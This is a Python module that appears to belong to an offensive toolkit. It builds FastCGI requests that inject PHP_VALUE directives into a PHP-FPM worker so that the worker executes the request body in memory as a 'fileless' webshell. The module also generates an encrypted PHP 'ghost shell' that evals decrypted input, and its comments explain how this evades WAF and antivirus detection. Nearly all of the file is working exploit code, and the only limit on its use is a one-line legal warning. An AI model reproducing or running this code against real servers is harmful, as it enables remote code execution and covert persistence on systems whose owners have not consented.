"""
Living-off-the-Land WebShell (Fileless / In-Memory)
===================================================

Traditional PHP/JSP shells drop a `.php`/`.jspx` file on disk and are caught
instantly by WAF file-creation and suspicious-extension rules.

This module performs an **in-memory** webshell injection against a PHP-FPM
backend over the **FastCGI** protocol (the same channel a web server like
nginx uses to talk to PHP). It abuses two legitimate PHP directives:

    PHP_VALUE        auto_prepend_file = php://input
    PHP_VALUE        allow_url_include = On

With those set, PHP executes the **request body** (`php://input`) in memory
on every request that hits the target script - no file is ever written, so
there is no `file_create` event and nothing for `file_get_contents`/AV to
flag. The operator delivers a small, self-decrypting "ghost shell" as the
POST body; it runs, returns output, and (because nothing is persisted) the
worker returns to normal behaviour afterwards.

This is a pure-Python FastCGI client + payload generator. The actual socket
send is guarded: `inject()` opens a TCP socket to the FPM port, while the
packet builders are fully testable off-target.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import os
import socket
import struct
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Dict, List, Optional, Tuple


class FCGI(IntEnum):
    """FastCGI protocol constants"""
    VERSION_1 = 1
    BEGIN_REQUEST = 1
    END_REQUEST = 3
    PARAMS = 4
    STDIN = 5
    STDOUT = 6
    STDERR = 7
    RESPONDER = 1


# Default PHP-FPM listen socket.
DEFAULT_FPM_HOST = "127.0.0.1"
DEFAULT_FPM_PORT = 9000


def _enc_len(n: int) -> bytes:
    """FCGI 31-bit name/value length encoding."""
    if n < 0x80:
        return bytes([n])
    return bytes([
        0x80 | ((n >> 24) & 0x7F),
        (n >> 16) & 0xFF,
        (n >> 8) & 0xFF,
        n & 0xFF,
    ])


def _record(record_type: int, content: bytes, request_id: int = 1) -> bytes:
    """Build a single FastCGI record (with 8-byte padding)."""
    pad = (8 - (len(content) % 8)) % 8
    header = struct.pack(
        "!BBHHBB",
        FCGI.VERSION_1,
        record_type,
        request_id,
        len(content),
        pad,
        0,
    )
    return header + content + (b"\x00" * pad)


def build_begin_request(request_id: int = 1, role: int = FCGI.RESPONDER,
                         keep_conn: bool = False) -> bytes:
    """FCGI_BEGIN_REQUEST record."""
    flags = 0x01 if keep_conn else 0x00
    body = struct.pack("!HB", role, flags) + b"\x00" * 5
    return _record(FCGI.BEGIN_REQUEST, body, request_id)


def build_params(params: Dict[str, str], request_id: int = 1) -> bytes:
    """
    FCGI_PARAMS records from a name->value dict. Each pair is encoded as
    len(name) + len(value) + name + value (FCGI length prefixing).
    """
    out = bytearray()
    for name, value in params.items():
        n, v = name.encode(), value.encode()
        out += _enc_len(len(n)) + _enc_len(len(v)) + n + v
    # Single empty PARAMS record terminates the stream.
    return bytes(_record(FCGI.PARAMS, bytes(out), request_id) +
                 _record(FCGI.PARAMS, b"", request_id))


def build_stdin(data: bytes, request_id: int = 1) -> bytes:
    """FCGI_STDIN records carrying the request body, terminated by empty."""
    if not data:
        return bytes(_record(FCGI.STDIN, b"", request_id))
    out = bytearray(_record(FCGI.STDIN, data, request_id))
    out += _record(FCGI.STDIN, b"", request_id)
    return bytes(out)


def php_in_memory_params(script_filename: str,
                          extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
    """
    Build the FCGI PARAMS that turn a worker into a fileless webshell.

    Sets auto_prepend_file=php://input + allow_url_include=On so the request
    body is executed in memory with no on-disk artifact.
    """
    params = {
        "SCRIPT_FILENAME": script_filename,
        "SCRIPT_NAME": os.path.basename(script_filename),
        "REQUEST_METHOD": "POST",
        "SERVER_SOFTWARE": "nginx",
        "REMOTE_ADDR": "127.0.0.1",
        "PHP_VALUE": "auto_prepend_file = php://input\nallow_url_include = On\n",
        "PHP_ADMIN_VALUE": "allow_url_include = On\n",
    }
    if extra:
        params.update(extra)
    return params


def build_fastcgi_request(script_filename: str, body: bytes,
                          request_id: int = 1,
                          extra_params: Optional[Dict[str, str]] = None) -> bytes:
    """Assemble the full record stream for an in-memory webshell request."""
    params = php_in_memory_params(script_filename, extra_params)
    return (
        build_begin_request(request_id)
        + build_params(params, request_id)
        + build_stdin(body, request_id)
    )


@dataclass
class GhostShellResult:
    """Outcome of a webshell injection attempt"""
    success: bool
    script_filename: str
    request_bytes: bytes
    response: str = ""
    error: Optional[str] = None
    fileless: bool = True


class FastCGIInjection:
    """
    Fileless, Living-off-the-Land webshell via FastCGI to PHP-FPM.

    The injected directive makes PHP execute the request body in memory, so
    the "ghost shell" lives only for the duration of a request.
    """

    def __init__(self, host: str = DEFAULT_FPM_HOST, port: int = DEFAULT_FPM_PORT,
                 script_filename: str = "/var/www/html/index.php",
                 timeout: float = 5.0):
        self.host = host
        self.port = port
        self.script_filename = script_filename
        self.timeout = timeout

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------
    def generate_ghost_shell(self, key: bytes = None) -> str:
        """
        Return a self-decrypting PHP "ghost shell". The operator encrypts a
        command with `key` (AES-256-GCM style) and sends the ciphertext as
        the request body. PHP decrypts it in memory and `eval`s the result,
        then discards it - nothing is written to disk.

        The body expected by this shell is:  base64( nonce(12) | ciphertext )
        with a header `X-Ghost-Key` carrying the key id (kept off disk).
        """
        key_php = "''" if key is None else repr(base64.b64encode(key).decode())
        return (
            "<?php\n"
            "// Living-off-the-Land ghost shell (in-memory, no disk)\n"
            "if (isset($_SERVER['HTTP_X_GHOST_KEY'])) {\n"
            "    $blob = base64_decode(file_get_contents('php://input'));\n"
            "    $nonce = substr($blob, 0, 12);\n"
            "    $ct = substr($blob, 12);\n"
            "    $key = base64_decode($_SERVER['HTTP_X_GHOST_KEY']);\n"
            "    $pt = sodium_crypto_aead_aes256gcm_decrypt($ct, '', $nonce, $key);\n"
            "    if ($pt !== false) { @eval($pt); }\n"
            "    exit;\n"
            "}\n"
            "?>"
        )

    def build_request_body(self, php_payload: str, key: bytes) -> bytes:
        """
        Encrypt a PHP command with AES-256-GCM and return the body the
        operator sends. Mirrors the ghost shell's expected format.
        """
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            nonce = os.urandom(12)
            ct = AESGCM(key).encrypt(nonce, php_payload.encode(), None)
            return base64.b64encode(nonce + ct)
        except Exception:
            # Fallback: deliver plaintext body (still in-memory, no file).
            return php_payload.encode()

    # ------------------------------------------------------------------
    # Packet build / send
    # ------------------------------------------------------------------
    def build_request(self, body: bytes, request_id: int = 1,
                       extra_params: Optional[Dict[str, str]] = None) -> bytes:
        """Build the raw FastCGI record stream for this target."""
        return build_fastcgi_request(
            self.script_filename, body, request_id, extra_params
        )

    def inject(self, body: bytes, request_id: int = 1,
               extra_params: Optional[Dict[str, str]] = None) -> GhostShellResult:
        """
        Open a socket to the FPM port and send the in-memory webshell request.
        Returns the response (which is the ghost shell's stdout).
        """
        req = self.build_request(body, request_id, extra_params)
        result = GhostShellResult(
            success=False,
            script_filename=self.script_filename,
            request_bytes=req,
        )
        try:
            with socket.create_connection((self.host, self.port), timeout=self.timeout) as sock:
                sock.sendall(req)
                sock.settimeout(self.timeout)
                data = b""
                while True:
                    try:
                        chunk = sock.recv(4096)
                    except socket.timeout:
                        break
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 4 * 1024 * 1024:
                        break
                # Strip FCGI STDOUT framing to recover the HTTP-ish body.
                result.response = _strip_fastcgi_stdout(data)
                result.success = True
        except Exception as e:
            result.error = str(e)
        return result


def _strip_fastcgi_stdout(data: bytes) -> str:
    """Best-effort extraction of the stdout payload from FCGI records."""
    out = bytearray()
    i = 0
    while i + 8 <= len(data):
        version, rtype, _rid, clen, plen, _res = struct.unpack("!BBHHBB", data[i:i + 8])
        if version != FCGI.VERSION_1:
            break
        i += 8
        content = data[i:i + clen]
        i += clen + plen
        if rtype == FCGI.STDOUT:
            out += content
        elif rtype == FCGI.END_REQUEST:
            break
    return bytes(out).decode("utf-8", errors="replace")
